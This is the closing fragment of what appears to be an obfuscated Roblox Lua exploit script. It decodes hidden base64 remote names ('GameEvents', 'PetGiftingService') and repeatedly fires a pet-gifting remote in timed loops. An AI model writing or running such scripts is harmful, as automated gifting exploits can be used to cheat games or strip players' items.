                            ReplicatedStorage:WaitForChild(DUUERMePSMzuIYDtMOQ('aGLiRCxqpdoOqaIqzqARsPpJinVLURdBpdsYSIWkwDYjDOxrUplGTDpR2FtZUV2ZW50cw==')):WaitForChild(DUUERMePSMzuIYDtMOQ('CdClSdcRmhHSAzBsyQnGxMJkHNaKRBIsOaWpuiBysJnpPKzAgLDbIAdUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
